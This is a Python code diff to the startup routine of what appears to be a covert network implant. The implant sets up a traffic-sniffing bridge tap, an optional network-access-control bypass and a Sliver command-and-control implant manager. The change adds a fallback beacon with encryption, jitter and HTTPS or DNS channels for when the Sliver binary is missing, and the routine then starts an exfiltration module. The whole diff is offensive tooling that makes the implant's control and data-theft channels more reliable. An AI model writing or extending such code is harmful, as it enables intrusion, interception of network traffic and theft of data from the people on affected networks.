@@ -76,10 +76,12 @@ def main():
 
     if config["sniffer"]["enabled"]:
         from software.sniffer.bridge_tap import BridgeTap
+        from software.watchdog import set_bridge_tap
         bridge = BridgeTap(config)
         if not bridge.setup_bridge():
             logger.error("Bridge setup failed — aborting")
             sys.exit(1)
+        set_bridge_tap(bridge)
         components.append(("bridge", bridge))
 
     if config.get("nac_bypass", {}).get("enabled"):
@@ -114,18 +116,26 @@ def main():
             sliver_cfg = c2_cfg.get("sliver", {})
             fallback_cfg = c2_cfg.get("fallback", {})
 
+            sliver_started = False
             if sliver_cfg.get("enabled"):
                 from software.c2.sliver import SliverManager
                 sliver = SliverManager(config)
-                sliver.start()
-                components.append(("sliver", sliver))
-                logger.info("Sliver implant manager started")
-            elif fallback_cfg.get("enabled"):
+                if sliver.is_implant_available or sliver_cfg.get("staging_url"):
+                    sliver.start()
+                    components.append(("sliver", sliver))
+                    sliver_started = True
+                    logger.info("Sliver implant manager started")
+                else:
+                    logger.warning("Sliver enabled but binary not found at %s — trying fallback",
+                                   sliver_cfg.get("implant_path"))
+
+            if not sliver_started and fallback_cfg.get("enabled"):
                 from software.c2.beacon import Beacon
                 fb_config = {
                     "c2": {
                         "beacon_interval_seconds": c2_cfg.get("beacon_interval_seconds", 300),
                         "jitter_percent": c2_cfg.get("jitter_percent", 20),
+                        "encryption_key": c2_cfg.get("encryption_key", ""),
                         "https": fallback_cfg.get("https", {}),
                         "dns": fallback_cfg.get("dns", {}),
                     }
@@ -133,6 +143,7 @@ def main():
                 beacon = Beacon(fb_config)
                 beacon.start()
                 components.append(("beacon", beacon))
+                logger.info("Python fallback beacon started")
 
         from software.c2.exfil import Exfiltrator
         exfil = Exfiltrator(config)
